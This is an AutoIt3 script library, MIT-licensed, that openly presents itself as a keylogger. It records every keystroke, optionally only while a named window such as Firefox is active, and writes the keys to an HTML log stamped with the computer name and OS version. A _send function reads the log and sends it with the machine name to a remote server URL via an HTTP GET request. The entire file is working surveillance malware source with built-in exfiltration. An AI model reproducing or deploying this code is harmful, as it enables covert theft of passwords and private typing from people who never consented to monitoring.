#Include-Once
#include <FileConstants.au3>
#Include <misc.au3>

; The MIT License (MIT)

; Copyright (c) 2014 Philipp Hagenlocher

; Permission is hereby granted, free of charge, to any person obtaining a copy
; of this software and associated documentation files (the "Software"), to deal
; in the Software without restriction, including without limitation the rights
; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
; copies of the Software, and to permit persons to whom the Software is
; furnished to do so, subject to the following conditions:

; The above copyright notice and this permission notice shall be included in
; all copies or substantial portions of the Software.

; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
; THE SOFTWARE.

; This AutoIt3-Script can be used to produce easy to read HTML-Files which contain 
; the output of a keylogger.

; By including the script, some global variables will be set automatically
Global $key = ""			; The pressed Key
Global $last = ""			; The pressed Key in the last iteration
Global $pressed = False		; A boolean to indicate whether a key was pressed in an iteration
Global $wait_time = 35 		; The time to wait between iterations (in milliseconds)
Global $file_path = ""		; The path of the file
Opt("WinTitleMatchMode", 2) ; Setting the WinTitleMatchMode for window-logging

; Initializes the HTML-File
Func _init($path)
	$Date=@mday&"."&@mon&"."&@year
	$Time=@hour&":"&@min&":"&@sec
	$Seperator = "\"
	If not StringCompare($path, "") Then $Seperator = ""
	$file_path = $path&$Seperator&@hour+@mon&"_"&@min*2&"_"&@sec*@year&".html"
	Global $File = FileOpen($file_path, 1) ; The filename needed to be a bit cryptic in case you have more than one in the same location
	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
EndFunc

; Initializes the HTML-File with a specified name and all global Variables
Func _initWithFilename($path, $filename)
	$Date=@mday&"."&@mon&"."&@year
	$Time=@hour&":"&@min&":"&@sec
	$Seperator = "\"
	If not StringCompare($path, "") Then $Seperator = ""
	$file_path = $path&$Seperator&$filename&".html"
	Global $File = FileOpen($file_path, 1) ; The file
	FileWrite($File, '<!DOCTYPE html><head><title>Keylogger-Output</title><style type="text/css">body{font-size:20px;}sc{color: red;font-size:80%;}h1{color: blue;}h3{color: blue;}</style></head><body>' & @CRLF)
	FileWrite($File,  "<h1>" & @ComputerName & " on " & @OSVersion & "</h1><h3>Date: " & $Date & "<br>Time: " & $Time & "</h3>" & @CRLF)
EndFunc

; Writes the last key to the file
Func _writeToFile()
	If StringLen($key) > 1 Then	; If the String is longer than 1, the pressed key cannot be a letter or number. It has to be a special key
		FileWrite($File, "<sc>_" & $key & "_</sc>") ; Special keys are surrounded with the <sc> tag
	Else
		FileWrite($File, $key)
	EndIF
EndFunc

; Returns the pressed key at the moment
Func _getPressedKey()
   $key = ""
	If _IsPressed('08') Then
		$key = "BACKSPACE"
	EndIf
	If _IsPressed('09') Then
		$key = "TAB"
	EndIf
	If _IsPressed('0C') Then
		$key = "CLEAR"
	EndIf
	If _IsPressed('0D') Then
		$key = "ENTER"
	EndIf
	If _IsPressed('11') Then
		$key = "CTRL"
	EndIf
	If _IsPressed('12') Then
		$key = "ALT"
	EndIf
	If _IsPressed('13') Then
		$key = "PAUSE"
	EndIf
	If _IsPressed('14') Then
		$key = "CAPS LOCK"
	EndIf
	If _IsPressed('1B') Then
		$key = "ESC"
	EndIf
	If _IsPressed('20') Then
		$key = " "
	EndIf
	If _IsPressed('21') Then
		$key = "PAGE UP"
	EndIf
	If _IsPressed('22') Then
		$key = "PAGE DOWN"
	EndIf
	If _IsPressed('23') Then
		$key = "END"
	EndIf
	If _IsPressed('24') Then
		$key = "HOME"
	EndIf
	If _IsPressed('25') Then
		$key = "LEFT ARROW"
	EndIf
	If _IsPressed('26') Then
		$key = "UP ARROW"
	EndIf
	If _IsPressed('27') Then
		$key = "RIGHT ARROW"
	EndIf
	If _IsPressed('28') Then
		$key = "DOWN ARROW"
	EndIf
	If _IsPressed('29') Then
		$key = "SELECT"
	EndIf
	If _IsPressed('2A') Then
		$key = "PRINT"
	EndIf
	If _IsPressed('2B') Then
		$key = "EXECUTE"
	EndIf
	If _IsPressed('2C') Then
		$key = "PRINT SCREEN"
	EndIf
	If _IsPressed('2D') Then
		$key = "INS"
	EndIf
	If _IsPressed('2E') Then
		$key = "DEL"
	EndIf
	If _IsPressed('30') Then
		$key = "0"
	EndIf
	If _IsPressed('31') Then
		$key = "1"
	EndIf
	If _IsPressed('32') Then
		$key = "2"
	EndIf
	If _IsPressed('33') Then
		$key = "3"
	EndIf
	If _IsPressed('34') Then
		$key = "4"
	EndIf
	If _IsPressed('35') Then
		$key = "5"
	EndIf
	If _IsPressed('36') Then
		$key = "6"
	EndIf
	If _IsPressed('37') Then
		$key = "7"
	EndIf
	If _IsPressed('38') Then
		$key = "8"
	EndIf
	If _IsPressed('39') Then
		$key = "9"
	EndIf
	If _IsPressed('41') Then
		$key = "A"
	EndIf
	If _IsPressed('42') Then
		$key = "B"
	EndIf
	If _IsPressed('43') Then
		$key = "C"
	EndIf
	If _IsPressed('44') Then
		$key = "D"
	EndIf
	If _IsPressed('45') Then
		$key = "E"
	EndIf
	If _IsPressed('46') Then
		$key = "F"
	EndIf
	If _IsPressed('47') Then
		$key = "G"
	EndIf
	If _IsPressed('48') Then
		$key = "H"
	EndIf
	If _IsPressed('49') Then
		$key = "I"
	EndIf
	If _IsPressed('4A') Then
		$key = "J"
	EndIf
	If _IsPressed('4B') Then
		$key = "K"
	EndIf
	If _IsPressed('4C') Then
		$key = "L"
	EndIf
	If _IsPressed('4D') Then
		$key = "M"
	EndIf
	If _IsPressed('4E') Then
		$key = "N"
	EndIf
	If _IsPressed('4F') Then
		$key = "O"
	EndIf
	If _IsPressed('50') Then
		$key = "P"
	EndIf
	If _IsPressed('51') Then
		$key = "Q"
	EndIf
	If _IsPressed('52') Then
		$key = "R"
	EndIf
	If _IsPressed('53') Then
		$key = "S"
	EndIf
	If _IsPressed('54') Then
		$key = "T"
	EndIf
	If _IsPressed('55') Then
		$key = "U"
	EndIf
	If _IsPressed('56') Then
		$key = "V"
	EndIf
	If _IsPressed('57') Then
		$key = "W"
	EndIf
	If _IsPressed('58') Then
		$key = "X"
	EndIf
	If _IsPressed('59') Then
		$key = "Y"
	EndIf
	If _IsPressed('5A') Then
		$key = "Z"
	EndIf
	If _IsPressed('5B') Then
		$key = "Left Windows"
	EndIf
	If _IsPressed('5C') Then
		$key = "Right Windows"
	EndIf
	If _IsPressed('60') Then
		$key = "Numeric keypad 0"
	EndIf
	If _IsPressed('61') Then
		$key = "Numeric keypad 1"
	EndIf
	If _IsPressed('62') Then
		$key = "Numeric keypad 2"
	EndIf
	If _IsPressed('63') Then
		$key = "Numeric keypad 3"
	EndIf
	If _IsPressed('64') Then
		$key = "Numeric keypad 4"
	EndIf
	If _IsPressed('65') Then
		$key = "Numeric keypad 5"
	EndIf
	If _IsPressed('66') Then
		$key = "Numeric keypad 6"
	EndIf
	If _IsPressed('67') Then
		$key = "Numeric keypad 7"
	EndIf
	If _IsPressed('68') Then
		$key = "Numeric keypad 8"
	EndIf
	If _IsPressed('69') Then
		$key = "Numeric keypad 9"
	EndIf
	If _IsPressed('6A') Then
		$key = "Multiply"
	EndIf
	If _IsPressed('6B') Then
		$key = "Add"
	EndIf
	If _IsPressed('6C') Then
		$key = "Separator"
	EndIf
	If _IsPressed('6D') Then
		$key = "Subtract"
	EndIf
	If _IsPressed('6E') Then
		$key = "Decimal"
	EndIf
	If _IsPressed('6F') Then
		$key = "Divide"
	EndIf
	If _IsPressed('70') Then
		$key = "F1"
	EndIf
	If _IsPressed('71') Then
		$key = "F2"
	EndIf
	If _IsPressed('72') Then
		$key = "F3"
	EndIf
	If _IsPressed('73') Then
		$key = "F4"
	EndIf
	If _IsPressed('74') Then
		$key = "F5"
	EndIf
	If _IsPressed('75') Then
		$key = "F6"
	EndIf
	If _IsPressed('76') Then
		$key = "F7"
	EndIf
	If _IsPressed('77') Then
		$key = "F8"
	EndIf
	If _IsPressed('78') Then
		$key = "F9"
	EndIf
	If _IsPressed('79') Then
		$key = "F10"
	EndIf
	If _IsPressed('7A') Then
		$key = "F11"
	EndIf
	If _IsPressed('7B') Then
		$key = "F12"
	EndIf
	If _IsPressed('90') Then
		$key = "NUM LOCK"
	EndIf
	If _IsPressed('91') Then
		$key = "SCROLL LOCK"
	EndIf
	If _IsPressed('A2') Then
		$key = "Left CONTROL"
	EndIf
	If _IsPressed('A3') Then
		$key = "Right CONTROL"
	EndIf
	If _IsPressed('A4') Then
		$key = "Left MENU"
	EndIf
	If _IsPressed('A5') Then
		$key = "Right MENU"
	EndIf
	If _IsPressed('BA') Then
		$key = ";"
	EndIf
	If _IsPressed('BB') Then
		$key = "="
	EndIf
	If _IsPressed('BC') Then
		$key = ","
	EndIf
	If _IsPressed('BD') Then
		$key = "-"
	EndIf
	If _IsPressed('BE') Then
		$key = "."
	EndIf
	If _IsPressed('BF') Then
		$key = "/"
	EndIf
	If _IsPressed('C0') Then
		$key = "`"
	EndIf
	If _IsPressed('DB') Then
		$key = "["
	EndIf
	If _IsPressed('DC') Then
		$key = "\"
	EndIf
	If _IsPressed('DD') Then
		$key = "]"
	EndIf

    ; If the key was a letter and the shift-key wasn't pressed, it will be lowered
	If StringLen($key) < 2 Then
		If not _IsPressed('10') Then
			$key = StringLower($key)
		EndIf
	 EndIf

	If StringCompare($key, "") Then $pressed = True ; Strangely "StringCompare" gives you a 0 (also interpreted as "False") when the strings match

EndFunc

; Takes the key and writes it to the file
Func _read()
   $last = $key
   _getPressedKey()
   If $pressed Then
	  If ($last <> $key) Then _writeToFile()
   EndIf
   Sleep($wait_time) ; Waiting just to keep the CPU-usage at a minimum
EndFunc

; An endless loop of reading (so the keylogger won't stop reading)
Func _run()
   While 1
	   _read()
	WEnd
EndFunc

; An endless loop of reading if a certain window is open
; This only works if the parameter contains a string which is present in the actual window title (e.g. "Firefox" is a sufficient parameter because every Firefox-Window has the String "Firefox" in its title)
Func _logWindow($title)
	While 1
		If WinActive($title) Then 
			_read()
		Else 
			Sleep($wait_time) 
		EndIf
	WEnd
EndFunc

; Sends the content of the log to a server-URL via GET
Func _send($url)
	FileClose($File) 					; The File is still opened in writing-mode so it is closed to...
	$File = FileOpen($file_path, 128)	; ...Open in again in read-mode
	$content = FileRead($File)
	InetRead($url & "?name=" & @ComputerName & "&content=" & $content) ; The name is needed to identify where the logs are coming from
	FileClose($File)
	$File = FileOpen($file_path, 1)
EndFunc
